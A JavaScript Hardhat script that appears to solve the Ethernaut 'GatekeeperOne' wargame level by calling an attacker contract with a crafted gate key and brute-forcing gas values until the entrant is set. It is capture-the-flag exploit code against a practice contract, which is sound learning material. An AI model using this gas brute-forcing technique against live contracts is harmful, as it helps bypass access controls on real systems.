const { ethers } = require("hardhat");
const hre = require("hardhat");

async function main() {
  const [owner] = await ethers.getSigners();
  // attach your instance address
  const Instance = "0xE7fb271d2865645cBAc4ceE44545fA730e2A0108";
  const GateKeeperOneContract = await ethers.getContractFactory(
    "GatekeeperOne"
  );
  const GateKeeperOne = GateKeeperOneContract.attach(Instance);

  const AttackGateKeeperOneContract = await ethers.getContractFactory(
    "AttackGateKeeperOne"
  );
  const AttackGateKeeperOne = AttackGateKeeperOneContract.attach(
    "0xB93B6Ad9a07eb42116F81e9130D4F64b754Ba329"
  );
  const txOrigin = owner.address.slice(-4);
  console.log(txOrigin);
  //Brute Force Attack
  for (let i = 0; i <= 300; i++) {
    try {
      let entered = await AttackGateKeeperOne.Attack(
        `0x100000000000${txOrigin}`,
        8191 * 3 + i,
        {
          gasLimit: 950000,
        }
      );
      console.log("passed with gas ->", 8191 * 3 + i);
      const entrant = await GateKeeperOne.entrant();
      console.log(entrant);
      if (entrant !== ethers.constants.AddressZero) break;
    } catch {}
  }

  const entrant = await GateKeeperOne.entrant();
  console.log(entrant);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
